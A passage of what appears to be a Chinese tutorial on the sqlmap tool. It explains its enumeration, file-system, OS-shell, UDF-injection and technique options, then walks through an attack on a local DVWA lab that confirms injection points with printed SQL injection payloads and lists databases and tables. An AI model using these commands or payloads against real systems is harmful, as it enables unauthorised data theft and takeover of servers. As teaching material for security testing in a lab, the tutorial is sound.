class="hljs-literal">--columns</span>           Enumerate DBMS database table columns<br>  <span class="hljs-literal">--schema</span>            Enumerate DBMS schema<br>  <span class="hljs-literal">--count</span>             Retrieve number of entries <span class="hljs-keyword">for</span> table(s)<br>  <span class="hljs-literal">--dump</span>              Dump DBMS database table entries<br>  <span class="hljs-literal">--dump-all</span>          Dump all DBMS databases tables entries<br>  <span class="hljs-literal">--search</span>            Search column(s), table(s) and/or database name(s)<br>  <span class="hljs-literal">--comments</span>          Check <span class="hljs-keyword">for</span> DBMS comments during enumeration<br>  <span class="hljs-literal">--statements</span>        Retrieve SQL statements being run on DBMS<br>  <span class="hljs-literal">-D</span> DB               DBMS database to enumerate<br>  <span class="hljs-literal">-T</span> TBL              DBMS database table(s) to enumerate<br>  <span class="hljs-literal">-C</span> COL              DBMS database table column(s) to enumerate<br>  <span class="hljs-literal">-X</span> EXCLUDE          DBMS database identifier(s) to not enumerate<br>  <span class="hljs-literal">-U</span> USER             DBMS user to enumerate<br>  <span class="hljs-literal">--exclude-sysdbs</span>    Exclude DBMS system databases when enumerating tables<br>  <span class="hljs-literal">--pivot-column</span>=P..  Pivot column name<br>  <span class="hljs-literal">--where</span>=DUMPWHERE   Use <span class="hljs-built_in">WHERE</span> condition <span class="hljs-keyword">while</span> table dumping<br>  <span class="hljs-literal">--start</span>=LIMITSTART  First dump table entry to retrieve<br>  <span class="hljs-literal">--stop</span>=LIMITSTOP    Last dump table entry to retrieve<br>  <span class="hljs-literal">--first</span>=FIRSTCHAR   First query output word character to retrieve<br>  <span class="hljs-literal">--last</span>=LASTCHAR     Last query output word character to retrieve<br>  <span class="hljs-literal">--sql-query</span>=SQLQ..  SQL statement to be executed<br>  <span class="hljs-literal">--sql-shell</span>         Prompt <span class="hljs-keyword">for</span> an interactive SQL shell<br>  <span class="hljs-literal">--sql-file</span>=SQLFILE  Execute SQL statements from given file(s)<br><br><span class="hljs-comment"># -a、--all：获取访问的所有内容，不推荐</span><br><span class="hljs-comment"># -b、--banner：获取数据库管理系统的详细信息</span><br><span class="hljs-comment"># --current-user：获取数据库管理系统当前用户</span><br><span class="hljs-comment"># --current-db：获取数据库管理系统的数据库名称</span><br><span class="hljs-comment"># --hostname：获取数据库管理系统的主机名称</span><br><span class="hljs-comment"># --is-dba：检测当前用户是否为数据库管理员（DBA），是则返回True</span><br><span class="hljs-comment"># --users：枚举用户列表</span><br><span class="hljs-comment"># --passwords：枚举每个用户的密码哈希值</span><br><span class="hljs-comment"># -U CU：指定破解当前用户的密码哈希值</span><br><span class="hljs-comment"># --privileges：枚举每个用户的权限，-U指定查看的用户</span><br><span class="hljs-comment"># --roles：枚举每个用户的角色</span><br><span class="hljs-comment"># --dbs：枚举所有数据库</span><br><span class="hljs-comment"># --tables：枚举数据库的所有表</span><br><span class="hljs-comment"># --columns：枚举数据库表的字段名</span><br><span class="hljs-comment"># --schema：获取数据库的架构，包含数据库、表和字段，及各自的类型</span><br><span class="hljs-comment"># --count：获取表中的数据个数，而非具体内容</span><br><span class="hljs-comment"># --dump：转储数据库表项，查询字段值</span><br><span class="hljs-comment"># --dump-all：列举所有数据库所有表中的所有数据</span><br><span class="hljs-comment"># --search：搜索特定的数据库名、特定表、特定列</span><br><span class="hljs-comment"># -D：查看指定的数据库名</span><br><span class="hljs-comment"># -T：查看指定的数据表名</span><br><span class="hljs-comment"># -C：查看指定的数据表列名</span><br><span class="hljs-comment"># --exclude-sysdbs：排除系统数据等相关内容</span><br><span class="hljs-comment"># --sql-query=QUERY：指定要执行的SQL语句</span><br><span class="hljs-comment"># --sql-shell：指定提示交互式SQL的shell</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-6-文件系统"><a href="#6-6-文件系统" class="headerlink" title="6-6 文件系统"></a>6-6 文件系统</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">File system access:<br>  These options can be used to access the back<span class="hljs-literal">-end</span> database management<br>  system underlying file system<br><br>  <span class="hljs-literal">--file-read</span>=FILE..  Read a file from the back<span class="hljs-literal">-end</span> DBMS file system<br>  <span class="hljs-literal">--file-write</span>=FIL..  <span class="hljs-built_in">Write</span> a local file on the back<span class="hljs-literal">-end</span> DBMS file system<br>  <span class="hljs-literal">--file-dest</span>=FILE..  Back<span class="hljs-literal">-end</span> DBMS absolute filepath to <span class="hljs-built_in">write</span> to<br><br><span class="hljs-comment"># --file-read：读取后端DBMS文件系统上的文件，文本或二进制文件</span><br><span class="hljs-comment"># --file-write：要上传到后端DBMS文件系统的本地文件，需结合--file-dest</span><br><span class="hljs-comment"># --file-dest=DFILE：要上传的后端DBMS绝对文件路径</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-7-操作系统"><a href="#6-7-操作系统" class="headerlink" title="6-7 操作系统"></a>6-7 操作系统</h2><ul>
+<li>操作系统<ul>
+<li>与数据库直接建立TCP连接，该连接可以是一个交互式命令行的Meterpreter会话。</li>
+<li>SQLMap根据Meterpreter会话生成Shellcode(漏洞代码)并提供4种方式用于执行。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Operating system access:<br>  These options can be used to access the back<span class="hljs-literal">-end</span> database management<br>  system underlying operating system<br><br>  <span class="hljs-literal">--os-cmd</span>=OSCMD      Execute an operating system command<br>  <span class="hljs-literal">--os-shell</span>          Prompt <span class="hljs-keyword">for</span> an interactive operating system shell<br>  <span class="hljs-literal">--os-pwn</span>            Prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>  <span class="hljs-literal">--os-smbrelay</span>       One click prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>  <span class="hljs-literal">--os-bof</span>            Stored procedure buffer overflow exploitation<br>  <span class="hljs-literal">--priv-esc</span>          Database <span class="hljs-keyword">process</span> user privilege escalation<br>  <span class="hljs-literal">--msf-path</span>=MSFPATH  Local path <span class="hljs-built_in">where</span> Metasploit Framework is installed<br>  <span class="hljs-literal">--tmp-path</span>=TMPPATH  Remote absolute path of temporary files directory<br><br><span class="hljs-comment"># --os-cmd=OSCMD：执行操作系统命令</span><br><span class="hljs-comment"># --os-shell：在内存中执行Meterpreter的shellcode</span><br><span class="hljs-comment"># --os-pwn：通过用户自定义的函数上传一个独立的payload执行</span><br><span class="hljs-comment"># --os-smbrelay：通过SMB***(MS08-068)执行Metasploit的shellcode</span><br><span class="hljs-comment"># SMB***(MS08-068)指微软在08年8月发布的安全公告MS08-068中</span><br><span class="hljs-comment"># 修复的Server Message Block (SMB)协议中的一个严重漏洞</span><br><span class="hljs-comment"># --os-bof：在内存中执行Metasploit的payload</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-8-常规模块"><a href="#6-8-常规模块" class="headerlink" title="6-8 常规模块"></a>6-8 常规模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">General:<br>  These options can be used to <span class="hljs-built_in">set</span> some general working parameters<br><br>  <span class="hljs-literal">-s</span> SESSIONFILE      Load session from a stored (.sqlite) file<br>  <span class="hljs-literal">-t</span> TRAFFICFILE      Log all HTTP traffic into a textual file<br>  <span class="hljs-literal">--abort-on-empty</span>    Abort <span class="hljs-keyword">data</span> retrieval on empty results<br>  <span class="hljs-literal">--answers</span>=ANSWERS   <span class="hljs-built_in">Set</span> predefined answers (e.g. <span class="hljs-string">&quot;quit=N,follow=N&quot;</span>)<br>  <span class="hljs-literal">--base64</span>=BASE64P..  <span class="hljs-keyword">Parameter</span>(s) containing Base64 encoded <span class="hljs-keyword">data</span><br>  <span class="hljs-literal">--base64-safe</span>       Use URL and filename safe Base64 alphabet (RFC <span class="hljs-number">4648</span>)<br>  <span class="hljs-literal">--batch</span>             Never ask <span class="hljs-keyword">for</span> user input, use the default behavior<br>  <span class="hljs-literal">--binary-fields</span>=..  Result fields having binary values (e.g. <span class="hljs-string">&quot;digest&quot;</span>)<br>  <span class="hljs-literal">--check-internet</span>    Check Internet connection before assessing the target<br>  <span class="hljs-literal">--cleanup</span>           Clean up the DBMS from sqlmap specific UDF and tables<br>  <span class="hljs-literal">--crawl</span>=CRAWLDEPTH  Crawl the website starting from the target URL<br>  <span class="hljs-literal">--crawl-exclude</span>=..  Regexp to exclude pages from crawling (e.g. <span class="hljs-string">&quot;logout&quot;</span>)<br>  <span class="hljs-literal">--csv-del</span>=CSVDEL    Delimiting character used <span class="hljs-keyword">in</span> CSV output (default <span class="hljs-string">&quot;,&quot;</span>)<br>  <span class="hljs-literal">--charset</span>=CHARSET   Blind SQL injection charset (e.g. <span class="hljs-string">&quot;0123456789abcdef&quot;</span>)<br>  <span class="hljs-literal">--dump-file</span>=DUMP..  Store dumped <span class="hljs-keyword">data</span> to a custom file<br>  <span class="hljs-literal">--dump-format</span>=DU..  Format of dumped <span class="hljs-keyword">data</span> (CSV (default), HTML or SQLITE)<br>  <span class="hljs-literal">--encoding</span>=ENCOD..  Character encoding used <span class="hljs-keyword">for</span> <span class="hljs-keyword">data</span> retrieval (e.g. GBK)<br>  <span class="hljs-literal">--eta</span>               Display <span class="hljs-keyword">for</span> each output the estimated time of arrival<br>  <span class="hljs-literal">--flush-session</span>     Flush session files <span class="hljs-keyword">for</span> current target<br>  <span class="hljs-literal">--forms</span>             Parse and test forms on target URL<br>  <span class="hljs-literal">--fresh-queries</span>     Ignore query results stored <span class="hljs-keyword">in</span> session file<br>  <span class="hljs-literal">--gpage</span>=GOOGLEPAGE  Use Google dork results from specified page number<br>  <span class="hljs-literal">--har</span>=HARFILE       Log all HTTP traffic into a HAR file<br>  <span class="hljs-literal">--hex</span>               Use hex conversion during <span class="hljs-keyword">data</span> retrieval<br>  <span class="hljs-literal">--output-dir</span>=OUT..  Custom output directory path<br>  <span class="hljs-literal">--parse-errors</span>      Parse and display DBMS error messages from responses<br>  <span class="hljs-literal">--preprocess</span>=PRE..  Use given script(s) <span class="hljs-keyword">for</span> preprocessing (request)<br>  <span class="hljs-literal">--postprocess</span>=PO..  Use given script(s) <span class="hljs-keyword">for</span> postprocessing (response)<br>  <span class="hljs-literal">--repair</span>            Redump entries having unknown character marker (?)<br>  <span class="hljs-literal">--save</span>=SAVECONFIG   Save options to a configuration INI file<br>  <span class="hljs-literal">--scope</span>=SCOPE       Regexp <span class="hljs-keyword">for</span> filtering targets<br>  <span class="hljs-literal">--skip-heuristics</span>   Skip heuristic detection of vulnerabilities<br>  <span class="hljs-literal">--skip-waf</span>          Skip heuristic detection of WAF/IPS protection<br>  <span class="hljs-literal">--table-prefix</span>=T..  Prefix used <span class="hljs-keyword">for</span> temporary tables (default: <span class="hljs-string">&quot;sqlmap&quot;</span>)<br>  <span class="hljs-literal">--test-filter</span>=TE..  <span class="hljs-built_in">Select</span> tests by payloads and/or titles (e.g. ROW)<br>  <span class="hljs-literal">--test-skip</span>=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)<br>  <span class="hljs-literal">--time-limit</span>=TIM..  Run with a time limit <span class="hljs-keyword">in</span> seconds (e.g. <span class="hljs-number">3600</span>)<br>  <span class="hljs-literal">--unsafe-naming</span>     Disable escaping of DBMS identifiers (e.g. <span class="hljs-string">&quot;user&quot;</span>)<br>  <span class="hljs-literal">--web-root</span>=WEBROOT  Web server document root directory (e.g. <span class="hljs-string">&quot;/var/www&quot;</span>)<br><br><span class="hljs-comment"># -s SESSIONFILE：清空之前的session，重新测试目标</span><br><span class="hljs-comment"># --batch：以无提示的模式运行，自动同意所有提示</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-9-其他模块"><a href="#6-9-其他模块" class="headerlink" title="6-9 其他模块"></a>6-9 其他模块</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Miscellaneous:<br>  These options <span class="hljs-keyword">do</span> not fit into any other category<br><br>  <span class="hljs-literal">-z</span> MNEMONICS        Use short mnemonics (e.g. <span class="hljs-string">&quot;flu,bat,ban,tec=EU&quot;</span>)<br>  <span class="hljs-literal">--alert</span>=ALERT       Run host OS command(s) when SQL injection is found<br>  <span class="hljs-literal">--beep</span>              Beep on question and/or when vulnerability is found<br>  <span class="hljs-literal">--dependencies</span>      Check <span class="hljs-keyword">for</span> missing (optional) sqlmap dependencies<br>  <span class="hljs-literal">--disable-coloring</span>  Disable console output coloring<br>  <span class="hljs-literal">--disable-hashing</span>   Disable hash analysis on table dumps<br>  <span class="hljs-literal">--list-tampers</span>      Display list of available tamper scripts<br>  <span class="hljs-literal">--no-logging</span>        Disable logging to a file<br>  <span class="hljs-literal">--no-truncate</span>       Disable console output truncation (e.g. long entr...)<br>  <span class="hljs-literal">--offline</span>           Work <span class="hljs-keyword">in</span> offline mode (only use session <span class="hljs-keyword">data</span>)<br>  <span class="hljs-literal">--purge</span>             Safely remove all content from sqlmap <span class="hljs-keyword">data</span> directory<br>  <span class="hljs-literal">--results-file</span>=<span class="hljs-built_in">R</span>..  Location of CSV results file <span class="hljs-keyword">in</span> multiple targets mode<br>  <span class="hljs-literal">--shell</span>             Prompt <span class="hljs-keyword">for</span> an interactive sqlmap shell<br>  <span class="hljs-literal">--tmp-dir</span>=TMPDIR    Local directory <span class="hljs-keyword">for</span> storing temporary files<br>  <span class="hljs-literal">--unstable</span>          Adjust options <span class="hljs-keyword">for</span> unstable connections<br>  <span class="hljs-literal">--update</span>            Update sqlmap<br>  <span class="hljs-literal">--wizard</span>            Simple wizard interface <span class="hljs-keyword">for</span> beginner users<br><br><span class="hljs-comment"># --shell：交互式sqlmap shell</span><br><span class="hljs-comment"># --wizard：提供向导界面，引导用户填参进行注入</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-最优模块"><a href="#1-最优模块" class="headerlink" title="(1) 最优模块"></a>(1) 最优模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Optimization:<br>  These options can be used to optimize the performance of sqlmap<br><br>  <span class="hljs-literal">-o</span>                  Turn on all optimization switches<br>  <span class="hljs-literal">--predict-output</span>    Predict common queries output<br>  <span class="hljs-literal">--keep-alive</span>        Use persistent HTTP(s) connections<br>  <span class="hljs-literal">--null-connection</span>   Retrieve page length without actual HTTP response body<br>  <span class="hljs-literal">--threads</span>=THREADS   Max number of concurrent HTTP(s) requests (default <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># -o：一键优化</span><br><span class="hljs-comment"># 开启则自动打开--keep-alive、--null-connection、--threads=3</span><br><span class="hljs-comment"># --predict-output：预测输出，与--threads不兼容</span><br><span class="hljs-comment"># --keep-alive：保持HTTP长连接，与--proxy不兼容</span><br><span class="hljs-comment"># --null-connection：HTTP空连接，与--text-only不兼容</span><br><span class="hljs-comment"># --threads=THREADS：指定HTTP并发请求最大数，与--predict-output不兼容</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-技术模块"><a href="#2-技术模块" class="headerlink" title="(2) 技术模块"></a>(2) 技术模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Techniques:<br>  These options can be used to tweak testing of specific SQL injection<br>  techniques<br><br>  <span class="hljs-literal">--technique</span>=TECH..  SQL injection techniques to use (default <span class="hljs-string">&quot;BEUSTQ&quot;</span>)<br>  <span class="hljs-literal">--time-sec</span>=TIMESEC  Seconds to delay the DBMS response (default <span class="hljs-number">5</span>)<br>  <span class="hljs-literal">--union-cols</span>=UCOLS  Range of columns to test <span class="hljs-keyword">for</span> UNION query SQL injection<br>  <span class="hljs-literal">--union-char</span>=UCHAR  Character to use <span class="hljs-keyword">for</span> bruteforcing number of columns<br>  <span class="hljs-literal">--union-from</span>=UFROM  Table to use <span class="hljs-keyword">in</span> FROM part of UNION query SQL injection<br>  <span class="hljs-literal">--union-values</span>=U..  Column values to use <span class="hljs-keyword">for</span> UNION query SQL injection<br>  <span class="hljs-literal">--dns-domain</span>=DNS..  Domain name used <span class="hljs-keyword">for</span> DNS exfiltration attack<br>  <span class="hljs-literal">--second-url</span>=SEC..  Resulting page URL searched <span class="hljs-keyword">for</span> second<span class="hljs-literal">-order</span> response<br>  <span class="hljs-literal">--second-req</span>=SEC..  Load second<span class="hljs-literal">-order</span> HTTP request from file<br><br><span class="hljs-comment"># --technique：默认情况下会尝试所有类型的注入</span><br><span class="hljs-comment"># B：基于bool的盲注</span><br><span class="hljs-comment"># E：基于报错的注入</span><br><span class="hljs-comment"># U：联合查询注入</span><br><span class="hljs-comment"># S：堆查询注入</span><br><span class="hljs-comment"># T：指时间盲注</span><br><span class="hljs-comment"># Q：嵌套查询注入</span><br><span class="hljs-comment"># 想要仅基于报错注入和堆栈的查询注入，可以指定–technique SE</span><br><br><span class="hljs-comment"># --time-sec=TIMESEC：指定基于时间盲注的延迟时间</span><br><span class="hljs-comment"># --union-cols=UCOLS：指定联合查询注入的列数</span><br><span class="hljs-comment"># --union-char=UCHAR：指定联合查询注入的字符</span><br><span class="hljs-comment"># --union-from=UFROM：指定联合查询注入的表名</span><br><span class="hljs-comment"># --dns-domain=DNS：DNS漏洞攻击</span><br><span class="hljs-comment"># --second-url=SEC：搜索二阶响应的结果页面URL</span><br><span class="hljs-comment"># --second-req=SEC：从文件加载二阶HTTP请求</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-暴力破解"><a href="#3-暴力破解" class="headerlink" title="(3) 暴力破解"></a>(3) 暴力破解</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">Brute force:<br>  These options can be used to run brute force checks<br><br>  <span class="hljs-literal">--common-tables</span>     Check existence of common tables<br>  <span class="hljs-literal">--common-columns</span>    Check existence of common columns<br>  <span class="hljs-literal">--common-files</span>      Check existence of common files<br><br><span class="hljs-comment"># --common-tables：暴力破解表名</span><br><span class="hljs-comment"># --common-columns：暴力破解列名</span><br><span class="hljs-comment"># --common-files：暴力破解文件</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-UDF模块"><a href="#4-UDF模块" class="headerlink" title="(4) UDF模块"></a>(4) UDF模块</h3><ul>
+<li>user-defined function，是一种针对MySQL和PostgreSQL的高级注入技术。</li>
+<li>可参考在线文档：<a target="_blank" rel="noopener" href="https://www.slideshare.net/slideshow/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857/4633857">Advanced SQL injection to operating system full control</a>。</li>
+<li>user-defined function功能仅在数据库管理系统是MySQL或PostgreSQL时可用。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">User<span class="hljs-literal">-defined</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">injection</span>:</span><br>  These options can be used to create custom user<span class="hljs-literal">-defined</span> functions<br><br>  <span class="hljs-literal">--udf-inject</span>        Inject custom user<span class="hljs-literal">-defined</span> functions<br>  <span class="hljs-literal">--shared-lib</span>=SHLIB  Local path of the shared library<br><br><span class="hljs-comment"># --udf-inject：注入用户自定义函数</span><br><span class="hljs-comment"># --shared-lib=SHLIB：指定共享库的本地路径</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="7-SQLMap实战演练"><a href="#7-SQLMap实战演练" class="headerlink" title="7 SQLMap实战演练"></a>7 SQLMap实战演练</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs MarkDown">目标URL：http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#<br>F12 &gt; Network &gt; 选中第一个请求 &gt; Request Headers &gt; Cookie<br>Cookie：PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-1-确认注入点"><a href="#7-1-确认注入点" class="headerlink" title="7-1 确认注入点"></a>7-1 确认注入点</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap <br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot;</span> <br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low&quot;</span> <span class="hljs-literal">--batch</span><br><br><span class="hljs-comment"># -u：指定目标URL</span><br><span class="hljs-comment"># --cookie：传入登录凭证</span><br><span class="hljs-comment"># --batch：自动选择默认选项，跳过询问，以下输出说明存在注入点</span><br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">20</span>:<span class="hljs-number">43</span>] [<span class="hljs-type">INFO</span>] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br><span class="hljs-literal">---</span><br><span class="hljs-keyword">Parameter</span>: id (GET)<br>  <span class="hljs-built_in">Type</span>: boolean<span class="hljs-literal">-based</span> blind<br>  Title: OR boolean<span class="hljs-literal">-based</span> blind - <span class="hljs-built_in">WHERE</span> or HAVING clause (NOT - MySQL comment)<br>  Payload: id=<span class="hljs-string">&#x27; OR NOT 9257=9257#&amp;Submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Type: error-based</span><br><span class="hljs-string">  Title: MySQL &gt;= 5.6 AND ..., HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="hljs-string">  Payload: id=&#x27;</span> AND GTID_SUBSET(CONCAT(...),<span class="hljs-number">7833</span>)<span class="hljs-literal">--</span> jHdo&amp;Submit=Submit<br><br>  <span class="hljs-built_in">Type</span>: time<span class="hljs-literal">-based</span> blind<br>  Title: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span> AND time<span class="hljs-literal">-based</span> blind (query <span class="hljs-built_in">SLEEP</span>)<br>  Payload: id=<span class="hljs-string">&#x27; AND (SELECT 8155 FROM (SELECT(SLEEP(5)))dXaG)-- uytw&amp;Submit=Submit</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Type: UNION query</span><br><span class="hljs-string">  Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="hljs-string">  Payload: id=&#x27;</span> UNION ALL <span class="hljs-built_in">SELECT</span> CONCAT(...),NULL<span class="hljs-comment">#&amp;Submit=Submit</span><br><span class="hljs-literal">---</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-2-获取数据库"><a href="#7-2-获取数据库" class="headerlink" title="7-2 获取数据库"></a>7-2 获取数据库</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap <br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot;</span> <br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low&quot;</span> <span class="hljs-literal">--dbs</span><br><br><span class="hljs-comment"># --dbs：列出数据库</span><br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">29</span>:<span class="hljs-number">34</span>] [<span class="hljs-type">INFO</span>] fetching database names<br>[<span class="hljs-number">15</span>:<span class="hljs-number">29</span>:<span class="hljs-number">34</span>] [<span class="hljs-type">WARNING</span>] reflective value(s) found and filtering out<br>available databases [<span class="hljs-number">2</span>]:<br>[*] dvwa<br>[*] information_schema<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-3-获取数据库表"><a href="#7-3-获取数据库表" class="headerlink" title="7-3 获取数据库表"></a>7-3 获取数据库表</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PowerShell">sqlmap <br>  <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;http://localhost:81/vulnerabilities/sqli/?id=&amp;Submit=Submit#&quot;</span> <br>  <span class="hljs-literal">--cookie</span>=<span class="hljs-string">&quot;PHPSESSID=g9ru8lin880c3191bq7csgoq9s; security=low&quot;</span> <span class="hljs-literal">-D</span> dvwa <span class="hljs-literal">--tables</span><br><br><span class="hljs-comment"># -D dvwa：指定数据库</span><br><span class="hljs-comment"># --tables：列出表名</span><br><br>[<span class="hljs-number">15</span>:<span class="hljs-number">35</span>:<span class="hljs-number">49</span>] [<span class="hljs-type">INFO</span>] fetching tables <span class="hljs-keyword">for</span> database: <span class="hljs-string">&#x27;dvwa&#x27;</span><br>[<span class="hljs-number">15</span>:<span class="hljs-number">35</span>:<span class="hljs-number">49</span>] [<span class="hljs-type">WARNING</span>] reflective value(s) found and filtering out<br>Database: dvwa<br>[<span class="hljs-number">2</span> <span class="hljs-type">tables</span>]<br>+<span class="hljs-literal">-----------</span>+<br>| guestbook |<br>| users     |<br>+<span class="hljs-literal">-----------</span>+<br></code></pre></td></tr></table></figure>
+
+
+
